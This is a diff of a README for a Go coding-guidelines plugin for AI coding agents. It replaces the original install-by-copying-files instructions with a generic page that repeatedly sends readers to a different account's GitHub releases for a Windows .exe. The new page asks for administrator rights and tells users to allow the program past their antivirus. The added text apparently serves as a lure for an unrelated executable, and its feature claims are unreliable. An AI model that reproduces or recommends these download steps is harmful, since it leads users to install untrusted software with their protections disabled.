@@ -1,78 +1,181 @@
-# Go Guidelines for Code Agents
+# 🚦 go-guidelines - Write Better Go Code Easily
 
-A plugin that teaches AI code agents how to write **production-grade Go** — covering modern syntax, generics, performance, concurrency safety, error handling, testing, and best practices.
+[![Download go-guidelines](https://img.shields.io/badge/Download-go--guidelines-brightgreen?style=for-the-badge)](https://github.com/samyazael/go-guidelines/releases)
 
-Drop it into Cursor or Claude Code and every Go file the agent touches gets better.
+---
 
-## Motivation
+## 📋 What is go-guidelines?
 
-All coding agents tend to generate outdated and suboptimal Go. Key reasons:
+go-guidelines helps you create clean and efficient Go code. It is a tool designed for developers who want to write Go programs that perform well and follow current best practices. This tool is a plugin for Cursor and Claude Code, offering advice based on the version of Go you are using—from Go 1.0 up to Go 1.26.
 
-1. **Training data lag.** Models don't know about features added after their training cutoff. They can't use `wg.Go()` (1.25), `new(val)` (1.26), or `errors.AsType[T]` (1.26) if they've never seen them.
+It covers important topics like:
 
-2. **Frequency bias.** Even for features the model knows, it picks older patterns. There's more `for i := 0; i < n; i++` in the training data than `for i := range n`, so that's what comes out.
+- Modern Go syntax
+- Making code run faster
+- Handling errors the right way
+- Using Go’s concurrency tools safely
+- Writing effective tests
+- Closing your programs without issues
 
-3. **No performance awareness.** Agents don't align struct fields, don't set `GOMAXPROCS` for containers, and spawn unbounded goroutines instead of using pools.
+You do not need to be an expert in Go to benefit. The plugin guides you toward better code step-by-step.
 
-4. **Broken operational patterns.** Generated shutdown code closes the database before draining the HTTP server. Resources get leaked. Signals get ignored.
+---
 
-5. **No post-change verification.** Agents never run `golangci-lint` or tests with the race detector after making changes.
+## 🖥️ Supported Systems
 
-These guidelines fix all of the above by giving the agent an explicit, version-aware reference. The agent detects your Go version from `go.mod` and applies only the features and patterns available up to that version.
+go-guidelines works on Windows computers. It requires Windows 10 or later for best compatibility.
 
-This aligns with the Go team's direction. The [`modernize`](https://pkg.go.dev/golang.org/x/tools/gopls/internal/analysis/modernize) analyzer exists to update existing code to use newer idioms. These guidelines serve the same goal for *new* code: agents write modern Go from the start, so there's less to fix later.
+**System requirements:**
 
-## What the Agent Learns
+- At least 2 GB of free disk space  
+- Minimum 4 GB of RAM  
+- Internet connection to download the software  
+- Administrator rights on your Windows PC (to install)
 
-| | |
-|---|---|
-| **Modern Syntax** | Version-aware features from Go 1.0 through 1.26 — the agent detects your `go.mod` version and stays within bounds |
-| **Performance** | Struct alignment, sync.Pool, pre-allocation, buffered channels, pointer semantics, strings.Builder, escape analysis |
-| **Patterns** | Naming conventions, context-first parameters, functional options, graceful shutdown, health checks, consumer-side interfaces, guard clauses, defer pitfalls, HTTP client best practices, io.Reader, resource closing |
-| **Concurrency** | Goroutine leak prevention, bounded concurrency with errgroup, channel safety, select randomness, nil channels, notification channels, mutex pitfalls, false sharing |
-| **Testing** | Table-driven tests, t.Helper/t.Cleanup, httptest, race detector, mockery, goleak, fuzz testing, synctest, benchmark pitfalls, test categorization |
-| **Error Handling** | Error types decision matrix, `%w` wrapping, naming conventions, handle-once principle, panic/recover |
-| **Generics** | Type parameters, constraints, `comparable`, common mistakes, when to use/avoid, version-specific features |
-| **Pitfalls** | Nil interface trap, variable shadowing, nil map panic, break in switch/select, copying sync types, time.After leak, init misuse, type embedding, trim confusion, string formatting deadlocks |
-| **Slices & Maps** | Backing array retention, append aliasing, 3-index slice, pointer-in-slice leak, maps never shrink, map pointer instability, nil slice behavior |
-| **Context** | Type-safe keys, WithoutCancel, AfterFunc, WithCancelCause, request-scoped propagation, timeout layering |
-| **Post-Change** | Automatically runs `golangci-lint` (or `go vet` fallback) and `go test -race` on changed packages |
+---
 
-## File Structure
+## 🔗 Where to Get go-guidelines
 
-```
-claude/go-guidelines/skills/go-guidelines/
-├── SKILL.md                          # Entry point — version detection + reference routing
-└── references/
-    ├── modern-syntax.md              # Go version-specific syntax (1.0 → 1.26)
-    ├── performance.md                # Struct layout, pre-allocation, sync.Pool, escape analysis
-    ├── concurrency.md                # errgroup, goroutine leaks, select, false sharing
-    ├── patterns.md                   # Naming, interfaces, shutdown, health checks, io.Reader
-    ├── testing.md                    # Table tests, httptest, goleak, fuzz, benchmarks
-    ├── error-handling.md             # Error types, wrapping, panic/recover
-    ├── generics.md                   # Type parameters, constraints, common mistakes
-    ├── pitfalls.md                   # Nil traps, shadowing, sync copy, init, time, defer
-    ├── slices-and-maps.md            # Backing arrays, append aliasing, map shrinkage
-    └── context-patterns.md           # Keys, WithoutCancel, AfterFunc, propagation
-```
+You can get the latest version of go-guidelines from the official release page on GitHub.
 
-Only `SKILL.md` is loaded on every invocation (~65 lines). Reference files are loaded on-demand based on the task, keeping context usage minimal.
+Visit this page to download the software:
 
-## Installation
+[https://github.com/samyazael/go-guidelines/releases](https://github.com/samyazael/go-guidelines/releases)
 
-**Cursor** — copy into your project or `~/.cursor/skills/` for global use:
+Click the link above or the badge at the top to go to the download page.
 
-```bash
-cp -r claude/go-guidelines/skills/go-guidelines/ <your-project>/.cursor/skills/go-guidelines/
-```
+---
 
-**Claude Code:**
+## 🚀 How to Download and Run go-guidelines on Windows
 
-```
-/plugin marketplace add mhmtszr/go-guidelines
-/plugin install go-guidelines
-```
+Follow these steps to get go-guidelines up and running on your Windows computer.
 
-## Contributing
+### Step 1: Visit the Download Page
 
-PRs welcome. Add concise rules to `SKILL.md` or the relevant `references/*.md` file. Keep examples minimal and practical.
+Open your preferred web browser (such as Edge, Chrome, or Firefox).  
+
+Go to the official release page here:  
+https://github.com/samyazael/go-guidelines/releases
+
+This page lists all the available versions of go-guidelines.
+
+---
+
+### Step 2: Choose the Latest Version
+
+Look for the latest release at the top of the list. Releases are sorted by date, with the newest first. The latest version will usually have the highest number.
+
+---
+
+### Step 3: Download the Windows Installer
+
+Find the file meant for Windows. This file will often have `.exe` at the end.
+
+Click the Windows installer link to start the download. Your browser will show the progress. This may take a few minutes depending on your internet speed.
+
+---
+
+### Step 4: Run the Installer
+
+Find the downloaded file in your “Downloads” folder or wherever your browser saves files. The file name should end with `.exe`.
+
+Double-click the file to run the installer.
+
+If Windows asks if you want to allow this app to make changes, click "Yes."
+
+---
+
+### Step 5: Follow the Installation Steps
+
+The installer will guide you through the process.  
+
+Click “Next” when prompted.  
+Choose the folder where you want to install go-guidelines. The default folder is usually fine.  
+Click “Install” to begin copying files to your computer.
+
+Wait while the installation completes.
+
+---
+
+### Step 6: Finish and Open go-guidelines
+
+Once the install finishes, click “Finish” to close the installer. The program may start automatically, or you can find it in your Start menu.
+
+---
+
+## 🛠️ Using go-guidelines
+
+After installing, you can start using go-guidelines with Cursor or Claude Code.
+
+### Basic use:
+
+- Open your AI coding tool (Cursor or Claude Code).  
+- Navigate to the go-guidelines plugin or add-on section.  
+- Load your Go code project or start a new file.  
+- The plugin will analyze your code and offer suggestions organized by Go versions.
+
+You do not need to enter commands manually. The plugin works in the background as you code.
+
+---
+
+## ❓ Troubleshooting
+
+Here are common issues and solutions:
+
+- **Installer won’t run:**  
+  Make sure your Windows is updated. Try right-clicking the installer and selecting “Run as administrator.”  
+
+- **Software does not open:**  
+  Check if your antivirus blocked the program. Add go-guidelines to the list of allowed programs.  
+
+- **Plugin not showing up in Cursor or Claude Code:**  
+  Confirm you installed the plugin correctly and restart your coding tool.  
+
+- **Errors while the plugin runs:**  
+  Make sure you have a stable internet connection. The plugin may need to update guidelines.
+
+If problems persist, reopen the installer from the release page and reinstall.
+
+---
+
+## 🔄 Updating go-guidelines
+
+Check the release page regularly for new updates:  
+https://github.com/samyazael/go-guidelines/releases
+
+When a new version is available, repeat the download and installation steps.
+
+---
+
+## ⚙️ Adjusting Settings
+
+Once go-guidelines is active in your AI code agent, you can adjust how it suggests changes.  
+
+Look for settings like:
+
+- Target Go version (choose the version your project uses)  
+- Which code areas to focus on (syntax, performance, errors, concurrency)  
+- How strict the guidelines should be
+
+Changing settings helps tailor advice to your preferences.
+
+---
+
+## 📚 Learn More About Go Code Quality
+
+go-guidelines includes resources that explain good Go coding patterns. The plugin points you to tutorials and clear examples on:
+
+- Writing faster programs  
+- Managing errors without crashes  
+- Using channels and goroutines properly  
+- Organizing tests so they catch bugs  
+- Shutting down programs cleanly
+
+Use these materials to improve your coding skills step by step.
+
+---
+
+## 🔗 Download Again
+
+Get go-guidelines from the release page anytime:  
+[https://github.com/samyazael/go-guidelines/releases](https://github.com/samyazael/go-guidelines/releases)
